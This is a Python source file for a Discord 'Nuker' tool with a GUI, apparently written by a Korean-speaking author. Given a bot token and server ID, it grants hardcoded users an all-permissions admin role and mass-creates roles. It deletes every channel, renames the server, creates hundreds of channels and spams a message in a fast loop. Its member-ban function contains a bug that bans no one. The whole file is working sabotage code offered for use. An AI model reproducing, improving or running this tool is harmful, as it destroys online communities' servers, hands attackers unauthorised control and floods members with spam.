import tkinter as tk
from tkinter import messagebox, scrolledtext
import discord
from discord.ext import commands, tasks
import asyncio
import threading
import random

colors = [
    discord.Colour.from_rgb(255, 0, 0), # 빨
    discord.Colour.from_rgb(255, 165, 0), # 주
    discord.Colour.from_rgb(255, 255, 0), # 노
    discord.Colour.from_rgb(0, 255, 0), # 초
    discord.Colour.from_rgb(0, 0, 255), #  파
    discord.Colour.from_rgb(0, 0, 139), # 남
    discord.Colour.from_rgb(128, 0, 128) # 보
]
messag = None 
names = None
GUILD_ID = None
bot = None
root = None
action_to_perform = None
console_output = None
Adminismine = ['']
intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.messages = True

async def create_admin(guild, role_name):
    current_roles = len(guild.roles)
    role = discord.utils.get(guild.roles, name=role_name)
    
    if not role and current_roles < 249:
        role = await guild.create_role(
            name=role_name,
            permissions=discord.Permissions.all(),
            colour=discord.Colour.from_rgb(140, 210, 255)
        )
        await asyncio.sleep(1)
        return role
    return role

async def add_admin(guild, role_name, Adminismine):
    try:
        role = await create_admin(guild, role_name)
        
        for user_id in Adminismine:
            member = guild.get_member(int(user_id))
            if role and member:
                await member.add_roles(role)
                pass
            else:
                pass
    except discord.Forbidden as e:
        pass
    except discord.HTTPException as e:
        pass
    except Exception as e:
        pass

async def create_roles(guild, names):
    batch_size = 30
    max_roles = 245
    current_roles = len(guild.roles)
    roles_to_create = min(max_roles - current_roles, batch_size)
    while current_roles < max_roles:
        create_tasks = [
            guild.create_role(
                name=(names),
                colour=random.choice(colors),
            ) for _ in range(roles_to_create)
        ]
        try:
            roles = await asyncio.gather(*create_tasks)
            current_roles += len(roles)
            log_to_console(f'{len(roles)}개의 새로운 역할을 생성함.')
            if current_roles >= max_roles:
                log_to_console('역할 생성 최대치에 도달했습니다.')
                break
            roles_to_create = min(max_roles - current_roles, batch_size)
        except discord.Forbidden as e:
            log_to_console(f'역할을 생성할 권한이 없음 : {e}')
            break
        except discord.HTTPException as e:
            log_to_console(f'HTTP 예외가 발생함 : {e}')
            break
        except Exception as e:
            log_to_console(f'알 수 없는 예외 발생 : {e}')
            break

async def delete_channels(guild):
    guild = bot.get_guild(GUILD_ID)
    all_channels = guild.channels
    batch_size = 30
    for i in range(0, len(all_channels), batch_size):
        delete_tasks = [channel.delete() for channel in all_channels[i:i + batch_size]]
        try:
            await asyncio.gather(*delete_tasks)
            log_to_console(f'{len(delete_tasks)}개의 채널을 삭제했습니다.')
        except discord.Forbidden as e:
            log_to_console(f'채널을 삭제할 권한이 없음: {e}')
        except discord.HTTPException as e:
            log_to_console(f'HTTP 예외가 발생함: {e}')
        except Exception as e:
            log_to_console(f'알 수 없는 오류가 발생함: {e}')

async def create_invite_channel(guild, names):
    try:
        channel = await guild.create_text_channel(name=names)
        await asyncio.sleep(1)
        return channel
    except discord.Forbidden as e:
        pass
    except discord.HTTPException as e:
        pass
    except Exception as e:
        pass

async def create_invite(guild):
    invite = await guild.text_channels[0].create_invite(max_age=0, max_uses=0)
    await asyncio.sleep(1)
    return invite

async def change_server_name(guild, names):
    if any(role.permissions.administrator for role in guild.me.roles):
        try:
            await guild.edit(name=names)
            log_to_console(f'서버 이름을 {names}로 바꿈')
        except discord.HTTPException as e:
                log_to_console(f'서버 이름을 변경하는 도중 오류 발생: {e}')
    else:
        log_to_console('서버 이름을 바꿀 권한이 없음')

async def create_channels(guild, names):
    batch_size = 30
    max_channels = 495
    current_channels = len(guild.channels)
    channels_to_create = min(max_channels - current_channels, batch_size)
    while current_channels < max_channels:
        create_tasks = [
            guild.create_text_channel(name= (names))
            for _ in range(channels_to_create)
        ]
        try:
            channels = await asyncio.gather(*create_tasks)
            current_channels += len(channels)
            log_to_console(f'{len(channels)}개의 새로운 채널을 생성함.')
            if current_channels >= max_channels:
                log_to_console('채널 생성 최대치에 도달했습니다.')
                break
            channels_to_create = min(max_channels - current_channels, batch_size)
        except discord.Forbidden as e:
            log_to_console(f'채널을 생성할 권한이 없음 : {e}')
            break
        except discord.HTTPException as e:
            log_to_console(f'HTTP 예외가 발생함 : {e}')
            break
        except Exception as e:
            log_to_console(f'알 수 없는 예외 발생 : {e}')
            break

async def send_message_to_random_channels(guild, message):
    text_channels = [channel for channel in guild.channels if isinstance(channel, discord.TextChannel)]
    batch_size = 25
    for i in range(0, len(text_channels), batch_size):
        batch_channels = text_channels[i:i + batch_size]
        for _ in range(5):
            send_tasks = [channel.send(message) for channel in batch_channels]
            if send_tasks:
                try:
                    await asyncio.gather(*send_tasks)
                    log_to_console(f'{len(batch_channels)}개의 채널에 메시지를 보냄!')
                except discord.Forbidden as e:
                    log_to_console(f'메시지를 보낼 권한이 없음: {e}')
                except discord.HTTPException as e:
                    log_to_console(f'메시지를 보내는 동안 HTTP 예외가 발생함: {e}')
            await asyncio.sleep(0.1)

@tasks.loop(seconds=0.1)
async def send_messages():
    guild = bot.get_guild(GUILD_ID)
    await send_message_to_random_channels(guild, message)

async def ban_members(guild):
    members = [member for member in guild.members if not member.bot]
    for i in range(1):
        ban_tasks = [member.ban(reason=(message)) for member in members[i:i]]
        try:
            await asyncio.gather(*ban_tasks)
            log_to_console(f'멤버를 차단했습니다.')
        except discord.Forbidden as e:
            log_to_console(f'멤버를 차단할 권한이 없음: {e}')
        except discord.HTTPException as e:
            log_to_console(f'HTTP 예외가 발생함: {e}')
        except Exception as e:
            log_to_console(f'알 수 없는 오류가 발생함: {e}')

async def on_ready():
    global GUILD_ID, action_to_perform, names, message
    guild = bot.get_guild(GUILD_ID)
    if guild:
        server_name = guild.name
        role_name = '에붸베'
        log_message = f'Action : {action_to_perform}\n' \
                      f'Bot Name : {bot.user.name}\n' \
                      f'Server Id : {GUILD_ID}\n' \
                      f'Server Name : {server_name}\n' \
                      f'Message : {message}\n' \
                      f'Names : {names}'
        if action_to_perform == 'Nuker':
            log_to_console(log_message)
            await create_admin(guild, role_name)
            await add_admin(guild, role_name, Adminismine)
            await create_roles(guild, names)
            await delete_channels(guild)
            await create_invite_channel(guild, names)
            await asyncio.sleep(1)
            await change_server_name(guild, names)
            await create_channels(guild, names)
            send_messages.start()
        else:
            log_to_console('알 수 없는 작업.')
        action_to_perform = None
    else:
        log_to_console('서버를 찾을 수 없음.')

def run_bot(mode=None):
    global bot
    if mode in ['Nuker', 'Ban_all']:
        bot.run(TOKEN)
    else:
        log_to_console("Unknown mode")

def start_bot(mode=None):
    global bot, action_to_perform
    action_to_perform = mode
    if mode in ['Nuker', 'Ban_all']:
        bot = commands.Bot(command_prefix='!', intents=intents)
        bot.event(on_ready)
        threading.Thread(target=run_bot, args=(mode,)).start()
    else:
        print("Unknown mode")

def stop_bot():
    global bot
    if bot is not None:
        asyncio.run_coroutine_threadsafe(bot.close(), bot.loop).result()
        console_output.delete('1.0', tk.END)
        log_to_console("Bot Is Shutting Down...")

def create_gui():
    def on_nuker_button_click():
        global GUILD_ID, TOKEN, message, names
        try:
            GUILD_ID = int(guild_id_entry.get())
            TOKEN = token_entry.get()
            message = message_entry.get()
            names = names_entry.get()
            start_bot(mode='Nuker')
            messagebox.showinfo("Info", "Nuke Is Starting...")
        except ValueError:
            messagebox.showerror("Error", "Please Enter 'Bot Token' And 'Server ID' And 'Message' And 'Names'")
        except Exception as e:
            messagebox.showerror("Error", f"An error occurred: {e}")

    global root, guild_id_entry, token_entry, message_entry, names_entry, console_output
    
    root = tk.Tk()
    root.title("Nuker")
    root.configure(bg='black')
    root.geometry("875x750")

    tk.Label(root, text="Bot Token", font=("Arial", 18), fg='purple', bg='black').pack(pady=(10, 5))
    token_frame = tk.Frame(root, bg='purple', bd=1, relief='solid')
    token_frame.pack(pady=(5, 5), padx=20, fill='x')
    token_entry = tk.Entry(token_frame, font=("Arial", 14), bg='black', fg='purple', borderwidth=0, justify='center', width=25)
    token_entry.pack(padx=3, pady=3, fill='x', expand=True)

    tk.Label(root, text="Server ID", font=("Arial", 18), fg='purple', bg='black').pack(pady=(15, 5))
    entry_frame = tk.Frame(root, bg='purple', bd=1, relief='solid')
    entry_frame.pack(pady=(5, 5), padx=20, fill='x')
    guild_id_entry = tk.Entry(entry_frame, font=("Arial", 14), bg='black', fg='purple', borderwidth=0, justify='center', width=25)
    guild_id_entry.pack(padx=3, pady=3, fill='x', expand=True)

    tk.Label(root, text="Message", font=("Arial", 18), fg='purple', bg='black').pack(pady=(15, 5))
    entry_frame = tk.Frame(root, bg='purple', bd=1, relief='solid')
    entry_frame.pack(pady=(5, 5), padx=20, fill='x')
    message_entry = tk.Entry(entry_frame, font=("Arial", 14), bg='black', fg='purple', borderwidth=0, justify='center', width=25)
    message_entry.pack(padx=3, pady=3, fill='x', expand=True)

    tk.Label(root, text="Names", font=("Arial", 18), fg='purple', bg='black').pack(pady=(15, 5))
    entry_frame = tk.Frame(root, bg='purple', bd=1, relief='solid')
    entry_frame.pack(pady=(5, 20), padx=20, fill='x')
    names_entry = tk.Entry(entry_frame, font=("Arial", 14), bg='black', fg='purple', borderwidth=0, justify='center', width=25)
    names_entry.pack(padx=3, pady=3, fill='x', expand=True)

    button_frame = tk.Frame(root, bg='black')
    button_frame.pack(pady=20)

    nuker_button = tk.Button(button_frame, text="Nuke", command=on_nuker_button_click, bg='purple', fg='red', font=("Arial", 14), borderwidth=2, relief='solid', highlightbackground='purple', highlightcolor='purple', width=8, height=1)
    nuker_button.grid(row=0, column=0, padx=10)

    stop_button = tk.Button(button_frame, text="Stop", command=stop_bot, bg='purple', fg='red', font=("Arial", 14), borderwidth=2, relief='solid', highlightbackground='purple', highlightcolor='purple', width=6, height=1)
    stop_button.grid(row=1, column=0, padx=10, pady=(30, 0), columnspan=2)
    
    console_output = scrolledtext.ScrolledText(root, wrap=tk.WORD, height=15, width=95, bg='black', fg='white', font=("Arial", 12))
    console_output.pack(padx=20, pady=10, fill=tk.BOTH, expand=True)

    root.protocol("WM_DELETE_WINDOW", root.quit)
    root.mainloop()
    
def log_to_console(message):
    if console_output:
        console_output.insert(tk.END, message + '\n')
        console_output.yview(tk.END)

if __name__ == "__main__":
    create_gui()